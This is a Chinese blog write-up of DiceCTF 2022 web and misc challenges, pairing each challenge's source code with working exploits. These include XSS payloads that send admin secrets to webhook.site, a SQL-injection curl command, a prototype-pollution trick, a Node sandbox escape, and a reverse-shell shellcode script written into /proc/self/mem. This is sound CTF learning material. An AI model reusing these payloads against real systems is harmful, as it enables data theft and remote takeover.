---
title: "diceCTF2022 Wp"
slug: "dicectf2022-wp"
description: "建议改为js-jail，已经学了亿吨js知识了"
date: 2022-02-17T00:00:24+08:00
categories: ["CTF"]
series: []
tags: ["wp"]
draft: false
toc: true
---

https://ctf.dicega.ng/challs  |  https://ctftime.org/event/1541/tasks/

https://hackmd.io/fmdfFQ2iS6yoVpbR3KCiqQ  |  官方wp

https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/  |  建议全部看完

https://blog.maple3142.net/2022/02/07/dicectf-2022-writeups  |  比较详细的wp

- [ ] TI-1337：属于是深入了解PVM，建议直接看别的师傅们的wp
- [ ] Vinegar：wp看不懂，涉及pwn和深入的pickle操作
- [ ] denoblog：一转pwn，看懂 但是不会
- [ ] carrot：很复杂的XS-Leaks，放弃
- [ ] dicevault：说是致敬vault，把vault做了之后看这个还是不会做，寄
- [ ] noteKeeper：很复杂的xss，寄

————属于是复现流做题选手重现江湖，就会做1道，其余全复现（哭哭），上面这几道题由于个人水平有限，复现都复不了，非常非常非常失败，建议看别的wp

## misc/welcome

> Please join the competition [Discord](https://discord.com/invite/CbCXtrDE5m) and read the `#rules` channel.

`dice{sice}`

## web/knock-knock

> Knock knock? Who's there? Another pastebin!!
>
> [knock-knock.mc.ax](https://knock-knock.mc.ax/)
>
> [index.js](https://static.dicega.ng/uploads/d90311de33b98f393614654acad1e2f57ac87b0a309ee0548a5f9e8b18f70a8b/index.js)  |  [Dockerfile](https://static.dicega.ng/uploads/6035c50d5bc8f1178f87aa6d16847cda0e611bdd68f72928f81f952ddef762c9/Dockerfile)

```js
const crypto = require('crypto');

class Database {
  constructor() {
    this.notes = [];
    this.secret = `secret-${crypto.randomUUID}`;
  }

  createNote({ data }) {
    const id = this.notes.length;
    this.notes.push(data);
    return {
      id,
      token: this.generateToken(id),
    };
  }

  getNote({ id, token }) {
    if (token !== this.generateToken(id)) return { error: 'invalid token' };
    if (id >= this.notes.length) return { error: 'note not found' };
    return { data: this.notes[id] };
  }

  generateToken(id) {
    return crypto
      .createHmac('sha256', this.secret)
      .update(id.toString())
      .digest('hex');
  }
}

const db = new Database();
db.createNote({ data: process.env.FLAG });

const express = require('express');
const app = express();

app.use(express.urlencoded({ extended: false }));
app.use(express.static('public'));

app.post('/create', (req, res) => {
  const data = req.body.data ?? 'no data provided.';
  const { id, token } = db.createNote({ data: data.toString() });
  res.redirect(`/note?id=${id}&token=${token}`);
});

app.get('/note', (req, res) => {
  const { id, token } = req.query;
  const note = db.getNote({
    id: parseInt(id ?? '-1'),
    token: (token ?? '').toString(),
  });
  if (note.error) {
    res.send(note.error);
  } else {
    res.send(note.data);
  }
});

app.listen(3000, () => {
  console.log('listening on port 3000');
});
```

典型的pastebin，提前将环境变量中的flag写到其中，对于note有id和token两项索引的标识（id是note的长度，note是生成的uuid）

看起来很安全，但是uuid用的key其实根本没调用`crypto.randomUUID`这个函数

![image-20220207154404210](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220207154404210.png)

而是一个完全的定值，flag的id=1，我们可以直接生成对应的token

```js
crypto.createHmac('sha256',secret).update('0').digest('hex')
```

值得注意的是这个定值和js的版本有关系，win和linux下的运行结果也有差异（换行符的问题

最后的token值

```
'7bd881fe5b4dcc6cdafc3e86b4a70e07cfd12b821e09a81b976d451282f6e264'
```

paylaod

```
/note?id=0&token=7bd881fe5b4dcc6cdafc3e86b4a70e07cfd12b821e09a81b976d451282f6e264
```

## web/blazingfast

> I made a blazing fast MoCkInG CaSe converter!
>
> [blazingfast.mc.ax](https://blazingfast.mc.ax/)  |  [Admin Bot](https://admin-bot.mc.ax/blazingfast)
>
> [blazingfast.tar](https://static.dicega.ng/uploads/c37db76fc7e66f32dee53b48652868aefd79193c1b5936e1f2441e3c70cfcdfa/blazingfast.tar)  |  [admin-bot.js](https://static.dicega.ng/uploads/1286aac5ffb57d27c1dc1e0221c7c3691e575181720449df62dff67d10ec6749/admin-bot.js)  |  [blazingfast.c](https://static.dicega.ng/uploads/209c5168fc160763f28a23f23280f921c7e544fb87323726e48584b89d774825/blazingfast.c)

这个题特殊在结合了webassembly，是个不常见的点（虽然在这题里作用并不大），整体思路还是比较清晰的

![image-20220209014034656](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220209014034656.png)

![image-20220209014118363](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220209014118363.png)

![image-20220209014131466](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220209014131466.png)

肯定是要xss的，接下来要思考如何绕过`mock`中的过滤，我在做的时候没有做出来，下面是复现

————先说一下很多人采用的非预期想法：结合了wasm（c语言编译）的数据写入，在末尾没有写入null-byte字符，而js只有在遇到null-byte才会停止数据读入，利用这一点我们可以完成数据走私smuggle，发送我们的payload；首先发送带有垃圾数据的xss payload，此时因为waf的检测而报错，之后再发送一个payload，覆盖前面的垃圾数据部分而留下xss的部分，并且并不会对xss的部分进行大小写的转换

这要求我们发送两次payload，而同时给admin的只有一个url，肯定不行

————预期解和这个差别其实并不很大，采用离谱的unicode欺骗payload的实际长度

![image-20220209021127464](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220209021127464.png)

首先检测输入内容的长度 大于1000退出，之后全部转为大写后再读入buf数组中，之后进行`blazingfast.mock()`处理时依据的length则是最开始init时的长度，只有膨胀前的部分会被`mock`处理，而随后剩下的部分将被走私读入`mocking`中，作为`mock`的返回值留到页面上 `document.getElementById('result').innerHTML = mock(str);`

关于获取flag的部分，我们需要获取admin的localStorage中的flag，需要`fetch`到我们的hookbin中，由于window是小写不能直接操作他，可以构造函数或是用原型的方式；payload可以用8进制或html实体

payload

```js
ﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄﬄ<img src=x onerror="''['\141\164']['\137\137\160\162\157\164\157\137\137']['\143\157\156\163\164\162\165\143\164\157\162']('\146\145\164\143\150(`\150\164\164\160\163://\167\145\142\150\157\157\153.\163\151\164\145/90396\1465\141-59\146\141-40\146\145-\14182\146-\145\14421\1415\14611009?Q=${\154\157\143\141\154S\164\157\162\141\147\145.\146\154\141\147}`)')()"/>
```

```js
<img src=x onerror="''['at']['__proto__']['constructor']('fetch(`https://webhook.site/90396f5a-59fa-40fe-a82f-ed21a5f11009?Q=${localStorage.flag}`)')()"/>
```

## web/no-cookies

> I found a more secure way to authenticate users. No cookies, no problems!
>
> [instancer.mc.ax/no-cookies](https://instancer.mc.ax/no-cookies)  |  [Admin Bot](https://admin-bot.mc.ax/no-cookies)
>
> [dist.tar](https://static.dicega.ng/uploads/40115eacc0285fc48defd70f48bd24608ca8ffa8b5600c0e7ed0308b780b432d/dist.tar)  |  [index.js](https://static.dicega.ng/uploads/d53bcd4311512459be586dede3b593170870500465dce9bada612dcfda0b101d/index.js)  |  [admin-bot.js](https://static.dicega.ng/uploads/c53891883a44e368d11a50bd8c13285009bf907571e4b826dee8f73d8d09ecb5/admin-bot.js)

还是先看admin bot

```js
import flag from './flag.txt';

function sleep(time) {
  return new Promise((resolve) => {
    setTimeout(resolve, time);
  });
}

export default {
  id: 'no-cookies',
  name: 'no-cookies',
  urlRegex:
    /^https:\/\/no-cookies-[a-f0-9]{16}\.mc\.ax\/view\?id=[a-f0-9]{32}$/,
  timeout: 10000,
  extraFields: [
    {
      name: 'instance',
      displayName: 'Instance ID',
      placeholder: 'no-cookies-{THIS}.mc.ax',
      regex: '^[0-9a-f]{16}$',
    },
  ],
  handler: async (url, ctx, { instance }) => {
    const page = await ctx.newPage();

    const doLogin = async (username, password) => {
      return new Promise((resolve) => {
        page.once('dialog', (first) => {
          page.once('dialog', (second) => {
            second.accept(password);
          });
          first.accept(username);
          resolve();
        });
      });
    };

    // make an account
    const username = Array(32)
      .fill('')
      .map(() => Math.floor(Math.random() * 16).toString(16))
      .join('');  // 用户名任意
    const password = flag;  // 我们要得到的flag 在密码中

    const firstLogin = doLogin(username, password);

    try {
      page.goto(`https://no-cookies-${instance}.mc.ax/register`); // 注册
    } catch {}

    await firstLogin; // 登入

    await sleep(3000);

    // visit the note and log in
    const secondLogin = doLogin(username, password);  // 再登入

    try {
      page.goto(url); // 访问我们的url
    } catch {}

    await secondLogin;

    await sleep(3000);
  },
};

```

看我们的index.js，页面不管什么操作，/register, /login, /create, /view都会先要求输入账号密码，我们可以创建md的内容并渲染出来，在/view处有这样的js

```js
(() => {
  const validate = (text) => {
    return /^[^$']+$/.test(text ?? '');	// 过滤 没过滤双引号
  }
  const promptValid = (text) => {
    let result = prompt(text) ?? '';
    return validate(result) ? result : promptValid(text);
  }
  const username = promptValid('Username:');
  const password = promptValid('Password:');	// 上一次正则
  const params = new URLSearchParams(window.location.search);
  (async () => {
    const { note, mode, views } = await (await fetch('/view', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        username,
        password,
        id: params.get('id')
      })
    })).json();
    if (!note) {
      alert('Invalid username, password, or note id');
      window.location = '/';
      return;
    }
    let text = note;
    if (mode === 'markdown') {
      text = text.replace(/\[([^\]]+)\]\(([^\)]+)\)/g, (match, p1, p2) => {	// 正则
        return `<a href="${p2}">${p1}</a>`;	// xss处
      });
      text = text.replace(/#\s*([^\n]+)/g, (match, p1) => {
        return `<h1>${p1}</h1>`;
      });
      text = text.replace(/\*\*([^\n]+)\*\*/g, (match, p1) => {
        return `<strong>${p1}</strong>`;
      });
      text = text.replace(/\*([^\n]+)\*/g, (match, p1) => {
        return `<em>${p1}</em>`;
      });
    }
    document.querySelector('.note').innerHTML = text;	// 插入页面中
    document.querySelector('.views').innerText = views;
  })();
})();
```

比较容易注意到这个xss点，它可以渲染超链接，但是没过滤双引号，导致我们可以这样

```
// md
(link text)[http://example.com" class="foo]
// innerHTML
<a href="http://example.com" class="foo">link text</a>
```

可以构造出这样的payload

```
// md
(link text)[http://example.com" onmouseover="alert`1`]
// innerHTML
<a href="http://example.com" onmouseover="alert`1`>link text</a>
```

不过admin无鼠标操作，这里要结合js正则匹配的特性，`RegExp.input`可以拿到上一次传入正则匹配函数中的输入值

```js
/a/.test('secret password')
console.log(RegExp.input) // secret password
```

不过仅有这一个xss点还不行，含有这样payload的note必须插入后得到一个admin能访问的url，这里就需要后端的sqlite注入了

```js
const db = {
  prepare: (query, params) => {
    if (params)
      for (const [key, value] of Object.entries(params)) {
        const clean = value.replace(/['$]/g, '');
        query = query.replaceAll(`:${key}`, `'${clean}'`);
      }
    return query;
  },

[...]
  run: (query, params) => {
    const prepared = db.prepare(query, params);
    console.log( prepared );
    return database.prepare(prepared).run();
  },
};
[...]

  db.run('INSERT INTO notes VALUES (:id, :username, :note, :mode, 0)', {
    id,
    username,
    note: note.replace(/[<>]/g, ''),
    mode,
  });
```

注意看db的操作

```js
for (const [key, value] of Object.entries(params)) {
    const clean = value.replace(/['$]/g, '');
    query = query.replaceAll(`:${key}`, `'${clean}'`);
}
```

对传入的每一对参数，按顺序，先把所有的单引号和`$`去掉，再替换`:param`为`'clean'`

在后面/create中会依次传入四个参数

```js
db.run('INSERT INTO notes VALUES (:id, :username, :note, :mode, 0)', {
    id,
    username,
    note: note.replace(/[<>]/g, ''),
    mode,
});
```

payload是这样

```js
"username": "a :note",
"password": "pass"
"note": ", :mode, 0, 0) -- ",
"mode": "actual note and xss"
```

```sqlite
-- 原
INSERT INTO notes VALUES (:id, :username, :note, :mode, 0)

-- id 123
INSERT INTO notes VALUES ('123', :username, :note, :mode, 0)

-- username
INSERT INTO notes VALUES ('123', 'a :note', :note, :mode, 0)

-- note 两个`:note`都会被换掉
INSERT INTO notes VALUES ('123', 'a ', :mode, 0, 0) -- '', ', :mode, 0, 0) -- ', :mode, 0)

-- mode 此时note值我们完全可控
INSERT INTO notes VALUES ('123', 'a ', 'actual note and xss', 0, 0) -- '', ', :mode, 0, 0) -- ', 'actual note and xss', 0)
```

所以结合上面，我们最终的payload是这样的

```shell
$ curl 'https://no-cookies-0ac0b52c95f3abe3.mc.ax/create' -H 'Content-Type: application/json' --data-raw '{"username":":note","password":"password","note":",:mode, 22, 0)-- ","mode":"<img src=x onerror=\"window.location=&quot;https://bawolff.net?&quot;+RegExp.input\">"}'
```

### 非预期

当然逃不了js大手子们的非预期解了，非预期没有用到`RegExp.input`，而是

```js
document.querySelector('.note').innerHTML = text;
document.querySelector('.views').innerText = views;
```

有两种情况

```html
<div id=x></div>
<div id=y>hello</div>
<script>
    x.innerHTML = '<img src=x onerror=alert(window.y.innerText)>'
    y.innerText = 'updated'
</script>
```

此时alert的内容是`updated`，而如果换成`<svg>`就不一样了

```html
<div id=x></div>
<div id=y>hello</div>
<script>
    x.innerHTML = '<svg><svg onload=alert(window.y.innerText)>'
    y.innerText = 'updated'
</script>
```

它alert的是前面的`hello`

而渲染页面的js代码简化后是这样

```js
(async () => {
  const { note, mode, views } = await (await fetch('/view', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      username,
      password,
      id: params.get('id')
    })
  })).json();

  document.querySelector('.note').innerHTML = text;
  // 在底下這行執行之前，會先執行我們的 XSS payload
  document.querySelector('.views').innerText = views;
})();
```

利用上面`<svg>`插入后先执行的特点，如果我们可以在最后一行执行之前，doSomeMagic，将`document.querySelector`覆盖，再把`JSON.stringify`覆盖，像这样

```js
document.querySelector = function(){
	JSON.stringify = function(date){

	}
}
```

之后就可以用传统艺能`arguments.callee.caller`了，可以取到调用`JSON.stringify`的`async`并调用一次，就可以执行我们的内容了

```js
document.querySelector = function(){
	JSON.stringify = function(data){
		console.log(data.password)	// true payload here!!!
	}
	arguments.callee.caller()
}
```

全payload

```js
<svg><svg/onload="document.querySelector=function(){JSON.stringify=a=>fetch(`https://webhook.site/11b32903-2d6a-4efc-b687-e06a0f0226aa?`+a.password),arguments.callee.caller()}">
```

## web/vm-calc

> A simple and very secure online calculator!
>
> [instancer.mc.ax/vm-calc](https://instancer.mc.ax/vm-calc)
>
> [dist.tar](https://static.dicega.ng/uploads/6dcf39e45c26032a15d83fb62515e9df26059e4345b978dad07a17b2bf2c5826/dist.tar)

先看package.json涉及到包的版本信息，最新版本的vm2(3.9.5)，无公开的逃逸漏洞 所以肯定不是沙盒逃逸，hbs版本存在一个文件泄露的洞[CVE-2021-32822](https://securitylab.github.com/advisories/GHSL-2021-020-pillarjs-hbs/)

然后看index.js，.我们需要登入admin账号拿flag，虽然给出了我们username和password，但是是sha256后的结果，没法摁得到明文

————看到wp后发现自己还是查的少了，不是vm2没0day，而是这里用的是Nodejs的1day，[CVE-2022-21824](https://nodejs.org/en/blog/vulnerability/jan-2022-security-releases/#prototype-pollution-via-console-table-properties-low-cve-2022-21824)，出问题的地方是`map`

```
console.table([{x:1}], ["__proto__"]);
```

就可以做到原型污染

题目中的filter检测是这样的

```js
if(users.filter(u => u.user === user && u.pass === hash)[0] !== undefined) {
    res.render("admin", { flag: await fsp.readFile("flag.txt") });
}
```

所以只要污染原型链，让`[][0]`不为空，就可以通过admin的检测

## web/shadow

> I found a totally secure way to insert secrets into a webpage
>
> [shadow.mc.ax](https://shadow.mc.ax/)  |  [Admin Bot](https://admin-bot.mc.ax/shadow)

页面源码可以看到js

```html
<script>
      // the admin has the flag set in localStorage["secret"]
      let secret = localStorage.getItem("secret") ?? "dice{not_real_flag}"
      let shadow = window.vault.attachShadow({ mode: "closed" });
      let div = document.createElement("div");
      div.innerHTML = `
          <p>steal me :)</p>
          <!-- secret: ${secret} -->
      `;
      let params = new URL(document.location).searchParams;
      let x = params.get("x");
      let y = params.get("y");
      div.style = y;
      shadow.appendChild(div);
      secret = null;
      localStorage.removeItem("secret");
      shadow = null;
      div = null;

      // free XSS
      window.xss.innerHTML = x;
</script>
```

使用cloesd模式的shadow DOM，我们无法直接处理它的DOM结构

但是CSS样式可控，我们这里使用一个非标准的CSS属性：`-webkit-user-modify`，它与`contenteditable`类似，可以调用`document.execCommand`来插入HTML

整体思路：先用 `window.find`去focus内容之后，再执行`document.execCommand`去插入 HTML，然后通过`svg`的event去执行JS拿到节点

```
/?y=-webkit-user-modify:+read-write&x=<img+src=x+onerror="find('steal me');document.execCommand('insertHTML',false,'<svg/onload=alert(this.parentNode.innerHTML)>')">
```

如果没有`focus`会失败；用img这样的会读不到`this.parentNode`，但是如果在前面加上`document.exec('selectAll')`也是可以的

```
/?y=-webkit-user-modify:+read-write&x=<img+src=x+onerror="find('steal me');document.execCommand('selectAll');document.execCommand('insertHTML',false,'<img/src=x+onerror=alert(this.parentNode.parentNode.innerHTML)>')">
```

## ***web/denoblog

> I love NodeJS and all, but I've heard that Deno is pretty cool...
>
> I'm making my new blog on it! Even if there's a vuln, Deno will protect me, right?
>
> [instancer.mc.ax/denoblog](https://instancer.mc.ax/denoblog)
>
> [dist.tar](https://static.dicega.ng/uploads/2d72629f8cef01b7c3809bfc5228d27865cfb9c54bc5772223456a9599d8c734/dist.tar)

页面上只有切换显示语言的功能，其它什么都没有，看一下app.ts

```tsx
import { serve } from "https://deno.land/std/http/server.ts";
import * as cookie from "https://deno.land/std/http/cookie.ts";

import * as dejs from "https://deno.land/x/dejs/mod.ts";

const port = 8080;

const handler = async (req: Request): Promise<Response> => {
  let lang = cookie.getCookies(req.headers)["lang"] ?? "en";

  let body = await dejs.renderFileToString("./views/index.ejs", { lang });

  let headers = new Headers();
  headers.set("content-type", "text/html");

  return new Response(body, { headers, status: 200 });
};

console.log("[app] server now listening for connections...");
await serve(handler, { port });
```

它使用cookie记录语言是`en`还是`es`，默认`en`，之后渲染`./views/index.ejs`为对应的语言

```ejs
<% await include(`./langs/${lang}`); %>
<!DOCTYPE html>
<html>
<head>
    <title>denoblog</title>
    <link rel="stylesheet" href="https://unpkg.com/@picocss/pico@latest/css/pico.classless.min.css">
</head>
<body>
    <main>
        <hgroup>
            <h1>denoblog</h1>
            <h2><%= i18n.HEADER %></h2>
        </hgroup>
        <nav>
            <ul>
                <li><%= i18n.SWITCH_LANG %></li>
                <li><a href="javascript:document.cookie = 'lang=en'; location.reload();">English</a></li>
                <li><a href="javascript:document.cookie = 'lang=es'; location.reload();">Español</a></li>
            </ul>
          </nav>
        <hr />
        <%= i18n.COMING_SOON %>
    </main>
</body>
</html>
```

注意到它用了`include`，如果让它包含其它的，就可以LFI了

```python
# 爆破pid
import requests

HOST = "https://denoblog-26b8ed381fd6c5f9.mc.ax"

while True:
    for num in range(8, 15):
        for num2 in range(9,13):
            print(f"attempting: ../../../../../../../../proc/{num}/fd/{num2}")
            try:
                r = requests.get(HOST, cookies={"lang": f"../../../../../../../../proc/{num}/fd/{num2}"})
            except:
                pass
```

但是如何rce呢？一转pwn势

在dockerfile中有这样的权限设置

```dockerfile
RUN deno compile --allow-read --allow-write --allow-net app.ts
RUN chmod 755 /app/app
```

写入`/proc/self/mem`，覆盖内存，调用`JSON.stringify`来触发代码

> Now, where to write is the question. I ran `deno` with gdb, and printed the address of `Builtins_JsonStringify`. This address was at a constant offset each time, so I just clobbered this region in memory with my own shellcode, then ran `JSON.stringify()` to trigger my code.
>
> ```
> (gdb) p Builtins_JsonStringify
> $4 = {<text variable, no debug info>} 0x281d340 <Builtins_JsonStringify>
> ```
>
> So, I created my shellcode, and injected into the `deno` process at the right section, then ran `JSON.stringify()` all through an ejs template included with a file descriptor. Doing all of this gets you the flag!

payload

```python
import requests
import base64

HOST = "https://denoblog-26b8ed381fd6c5f9.mc.ax"

IPADDR = "1.1.1.1"
PORT = 12345

addr_hex = bytes.fromhex(''.join([hex(int(n))[2:].zfill(2) for n in IPADDR.split(".")]))
port_hex = bytes.fromhex(hex(PORT)[2:])

shellcode = \
b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a" + \
b"\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0" + \
b"\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24" + \
b"\x02" + port_hex + b"\xc7\x44\x24\x04" + addr_hex + b"\x48\x89\xe6\x6a\x10" + \
b"\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48" + \
b"\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a" + \
b"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54" + \
b"\x5f\x6a\x3b\x58\x0f\x05"

payload = """
<%
let maps = await Deno.readTextFile('/proc/self/maps');
let line = maps.split("\\n").find(l => l.includes("/app/app") && l.includes("r-x"));

let base = parseInt(line.split(" ")[0].split("-")[0], 16);
let mem = await Deno.open('/proc/self/mem', { write: true });

let offset = base + 0xd39340;
console.log("[pwn] Builtins_JsonStringify @ 0x" + (offset).toString(16));
await Deno.seek(mem.rid, offset, Deno.SeekMode.Start);

let shellcode = `""" + base64.b64encode(shellcode).decode() + """`;
shellcode = atob(shellcode);
shellcode = "\\x90".repeat(512) + shellcode;
let shellcode_arr = new Uint8Array(shellcode.length);

for(let i = 0; i < shellcode.length; i++) {
    shellcode_arr[i] = shellcode.charCodeAt(i);
}

console.log("[pwn] lets go~");

await Deno.write(mem.rid, shellcode_arr);
JSON.stringify("wtmoo");
%>
"""

payload += "A"*1024*64

print(f"sending rev shell to {IPADDR}:{PORT}...")
while True:
    r = requests.get(HOST, data=payload)
```

还能说什么呢 牛逼

————以上后面pwn的地方我直接复制的官方wp

## misc/undefined

> I was writing some Javascript when everything became undefined...
>
> Can you create something out of nothing and read the flag at `/flag.txt`? Tested for Node version 17.
>
> `nc mc.ax 31131`
>
> [index.js](https://static.dicega.ng/uploads/014c52a7d294f05332240ef18c2c296af6e4bea6ff6899b7f09726e19c74dec7/index.js)

额，几乎把js所有乱七八糟的东西都整成undefined了

但是`import`还可以动态引入（作者忽略了

```js
import('fs').then(fs=>fs.readFile('/flag.txt','utf-8',(err,data)=>{console.log(data,err)}));
```

预期则是这样

```js
(function(){return arguments.callee.caller.arguments[1]("fs").readFileSync("/flag.txt","utf-8")})()
```

随便一个函数，`arguments.callee`得到当前执行的函数，`arguments.callee.caller`得到调用它的函数，再通过`arguments[1]`获得到`require`这个参数，执行`require("fs")`以及后续操作

————这里还有一个方法2：

利用Node可以拿到`structured Stack Trace`的feature

```js
function CustomError() {
  const oldStackTrace = Error.prepareStackTrace
  try {
    Error.prepareStackTrace = (err, structuredStackTrace) => structuredStackTrace
    Error.captureStackTrace(this)
    this.stack
  } finally {
    Error.prepareStackTrace = oldStackTrace
  }
}
function trigger() {
  const err = new CustomError()
  for (const x of err.stack) {
    console.log(x.getFunction()+"")
  }
}
trigger()
```

我们可以用`x.getFunction()`拿到上层的function，就是Node在执行时加上的wrapper，再通过`arguments`得到`fn.arguments[1]`（也就是`require`

放到题目中由于没有`Error`可以用，我们直接自制一个TypeError

```js
try {
	null.f()
} catch (e) {
	TypeError = e.constructor
}
Error = TypeError.prototype.__proto__.constructor
```

再利用TypeError是继承自Error的特性，就可以不依靠global拿到Error constructor了

全payload

```js
try {
	null.f()
} catch (e) {
	TypeError = e.constructor
}
Object = {}.constructor
String = ''.constructor
Error = TypeError.prototype.__proto__.constructor
function CustomError() {
	const oldStackTrace = Error.prepareStackTrace
	try {
		Error.prepareStackTrace = (err, structuredStackTrace) => structuredStackTrace
		Error.captureStackTrace(this)
		this.stack
	} finally {
		Error.prepareStackTrace = oldStackTrace
	}
}
function trigger() {
	const err = new CustomError()
	console.log(err.stack[0])
	for (const x of err.stack) {
		const fn = x.getFunction()
		console.log(String(fn).slice(0, 200))
		console.log(fn?.arguments)
		console.log('='.repeat(40))
		if ((args = fn?.arguments)?.length > 0) {
			req = args[1]
			console.log(req('child_process').execSync('id').toString())
		}
	}
}
trigger()
// dice{who_needs_builtins_when_you_have_arguments}

```

------

人在家中坐，开学延期天上来

不能继续摆了，我他妈学爆！！！！！！
